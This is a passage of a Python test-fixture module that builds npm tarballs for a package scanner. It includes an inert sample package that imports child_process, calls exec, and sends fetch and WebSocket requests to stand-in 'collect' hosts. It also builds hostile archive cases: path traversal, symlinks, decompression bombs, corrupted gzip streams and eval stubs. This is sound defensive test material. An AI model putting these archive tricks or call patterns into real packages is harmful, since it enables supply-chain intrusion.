    return b'\x1f\x8b\x08\x00' + bytes(4) + b'\x00\xff' + body + struct.pack('<II', zlib.crc32(data), len(data))


def _header(name, size=0, kind=b'0', link=''):
    name, link = name.encode('utf-8'), link.encode('utf-8')
    if len(name) > 100 or len(link) > 100:
        raise ValueError('Fixture header field exceeds USTAR width')
    header = bytearray(BLOCK)
    for at, width, value in ((0, 100, name), (100, 8, b'0000644\0'), (108, 8, b'0000000\0'),
                             (116, 8, b'0000000\0'), (124, 12, f'{size:011o}\0'.encode()),
                             (136, 12, b'00000000000\0'), (148, 8, b'        '), (156, 1, kind),
                             (157, 100, link), (257, 6, b'ustar\0'), (263, 2, b'00')):
        header[at:at + width] = value.ljust(width, b'\0')
    header[148:156] = f'{sum(header):06o}\0 '.encode()
    return bytes(header)


def _pax(key, value):
    payload = key.encode() + b'=' + value.encode('utf-8') + b'\n'
    size = len(payload) + 2
    while size != len(str(size)) + 1 + len(payload):
        size = len(str(size)) + 1 + len(payload)
    return str(size).encode() + b' ' + payload


def tar_bytes(entries):
    """Entries are (name, bytes, typeflag, linkname); PAX path records are explicit in the layout."""
    out, members, physical = bytearray(), [], []

    def append(name, child, kind=b'0', link=''):
        at = len(out)
        out.extend(_header(name, len(child), kind, link))
        out.extend(child)
        out.extend(bytes(-len(child) % BLOCK))
        physical.append({'name': name, 'kind': kind.decode(), 'header_offset': at,
                         'data_offset': at + BLOCK, 'size': len(child)})
        return at

    for name, child, kind, link in entries:
        pax = append('PaxHeaders/path', _pax('path', name), b'x') if len(name.encode('utf-8')) > 100 else None
        header_at = append('PaxFile' if pax is not None else name, child, kind, link)
        members.append({'name': name, 'data': child, 'kind': kind.decode(), 'linkname': link,
                        'header_offset': header_at, 'data_offset': header_at + BLOCK,
                        'size': len(child), 'pax_offset': pax})
    out.extend(bytes(2 * BLOCK))
    return bytes(out), {'members': members, 'entries': physical, 'entry_count': len(physical)}


def _wrapped(tar, layout, *, level=6):
    data = gzip_bytes(tar, level=level)
    files = []
    names = [F.escaped(member['name'])[:255] for member in layout.get('members', ())]
    for member, name in zip(layout.get('members', ()), names):
        if member['kind'] == '5' or not F.is_javascript(member['name']):
            continue
        flags = set()
        if member['kind'] in ('1', '2'):
            flags.add('hardlink' if member['kind'] == '1' else 'symlink')
        if member['name'].startswith('../'):
            flags.add('traversing_name')
        if names.count(name) > 1:
            flags.add('duplicate_name')
        if len(F.escaped(member['name'])) > 255:
            flags.add('long_name')
        child = member['data']
        header = bool(flags) or not child
        at = member['header_offset'] if header else member['data_offset']
        payload = tar[at:at + BLOCK] if header else child
        artifact = {'member': name or 'tar header', 'method': 1, 'data_offset': 0,
                    'compressed_size': len(data), 'inner_offset': at, 'size': len(payload),
                    'crc32': zlib.crc32(payload), 'sha256': hashlib.sha256(payload).hexdigest()}
        lines, max_line = F.line_metrics(child)
        files.append({'name': member['name'], 'data': child, 'header_offset': member['header_offset'],
                      'data_offset': member['data_offset'], 'anchor_space': 'tar' if header else 'child',
                      'anchor': {'offset': at if header else 0, 'length': min(len(payload), 4096)},
                      'location': {'offset': 0, 'length': min(len(payload), 4096)},
                      'artifact': artifact,
                      'row': {'file': name, 'size': len(child),
                              'sha256': None if flags else hashlib.sha256(child).hexdigest(),
                              'lines': None if flags else lines, 'max_line': None if flags else max_line,
                              'flags': sorted(flags)}})
    return data, {**layout, 'files': files, 'tar_size': len(tar), 'tar_sha256': hashlib.sha256(tar).hexdigest(),
                  'gzip_size': len(data), 'gzip_sha256': hashlib.sha256(data).hexdigest()}


def npm_tgz():
    package, strings = F.json_text(PACKAGE)
    index, imarks = F.source(
        '// Inert fixture, caf\u00e9; never execute.',
        ('const cp = require(\'', ('child_process', 'child_process'), '\');'),
        ('const endpoint = \'', ('url', 'https://fixture.invalid/collect'), '\';'),
        (('process_call', 'cp.exec('), "'echo fixture');"),
        (('fetch', 'fetch('), 'endpoint);'),
    )
    net, nmarks = F.source(
        ('import { decode } from ', ('module', "'./decode.mjs'"), ';'),
        ('export const open = name => ', ('dynamic_import', 'import(n'), 'ame);'),
        ('export const socket = new ', ('web_socket', 'WebSocket'),
         "('", ('url', 'wss://fixture.invalid/live'), "');"),
    )
    types, tmarks = F.source('export const limit: number = 3;',
                            ('export const decoded = ', ('atob', 'atob('), "'Zml4dHVyZQ==');"))
    entries = [('package/', b'', b'5', ''), ('package/lib/', b'', b'5', ''), ('package/src/', b'', b'5', ''),
               ('package/package.json', package, b'0', ''), ('package/index.js', index, b'0', ''),
               ('package/lib/net.mjs', net, b'0', ''), ('package/src/types.ts', types, b'0', ''),
               (PAX_PATH, b'export const answer = 42;\n', b'0', ''), ('package/empty.js', b'', b'0', ''),
               ('package/README.md', b'Inert fixture; no installation or execution.\n', b'0', '')]
    tar, layout = tar_bytes(entries)
    marks = {'package/index.js': imarks, 'package/lib/net.mjs': nmarks, 'package/src/types.ts': tmarks}
    hints, modules, calls = [], [], []
    categories = {'child_process': 'shell', 'url': 'endpoint', 'process_call': 'shell', 'fetch': 'network',
                  'dynamic_import': 'dynamic_code', 'web_socket': 'network', 'atob': 'encoding'}
    for name, spans in marks.items():
        for span in spans:
            label, at, size = span['label'], span['offset'], span['length']
            if label in categories:
                hints.append({'offset': at, 'length': size, 'row': {'file': name, 'category': categories[label],
                              'hint': label, 'text': span['text'], 'truncated': False}})
            if label in ('process_call', 'fetch', 'web_socket', 'atob'):
                callee = span['text'].removesuffix('(')
                calls.append({'offset': at, 'length': len(callee), 'row': {'file': name, 'callee': callee}})
            if label in ('child_process', 'module'):
                source = span['text'] if label == 'child_process' else span['text'][1:-1]
                modules.append({'offset': at - 1 if label == 'child_process' else at,
                                'length': size + 2 if label == 'child_process' else size,
                                'row': {'file': name, 'form': 'require' if label == 'child_process' else 'import',
                                        'source': source, 'truncated': False}})
    layout.update(marks=marks, hints=hints, modules=modules, calls=calls,
                  package={'name': 'package/package.json', 'data': package, 'strings': strings,
                           'rows': F.package_rows(strings, 'package/package.json')})
    return _wrapped(tar, layout)


def tgz_hostile(kind):
    if kind not in HOSTILE_KINDS:
        raise ValueError('Unknown hostile tarball fixture')
    if kind == 'too_many_entries':
        count = 65537
        tar = b''.join(_header(f'package/f{i}.js') for i in range(count)) + bytes(2 * BLOCK)
        return _wrapped(tar, {'problem': kind, 'entry_count': count}, level=0)
    entries = [('package/index.js', b'eval(code);\n', b'0', '')]
    if kind in ('symlink', 'hardlink'):
        entries = [('package/link.js', b'', b'2' if kind == 'symlink' else b'1', 'outside.js')]
    elif kind == 'traversal':
        entries = [('../outside.js', b'eval(code);\n', b'0', '')]
    elif kind == 'duplicate':
        entries *= 2
    elif kind == 'long_name':
        entries = [('package/' + 'x' * 256 + '.js', b'eval(code);\n', b'0', '')]
    elif kind == 'ratio':
        entries = [('package/zeros.js', bytes(256 * 1024), b'0', '')]
    tar, layout = tar_bytes(entries)
    if kind == 'truncated_tar':
        tar = tar[:layout['members'][0]['data_offset'] + len(entries[0][1]) - 1]
    elif kind == 'bad_tar_checksum':
        tar = bytes([tar[0] ^ 1]) + tar[1:]
    data, layout = _wrapped(tar, {**layout, 'problem': kind})
    if kind == 'gzip_trailing_data':
        data += b'unapproved trailing data'
    elif kind == 'gzip_concatenated':
        data += gzip_bytes(tar)
    elif kind in ('gzip_crc', 'gzip_isize'):
        at = -8 if kind == 'gzip_crc' else -4
        changed = bytearray(data)
        changed[at] ^= 1
        data = bytes(changed)
    elif kind == 'not_gzip':
        data = b'\x1f\x8bnot a gzip stream'
    layout.update(gzip_size=len(data), gzip_sha256=hashlib.sha256(data).hexdigest())
    return data, layout
```
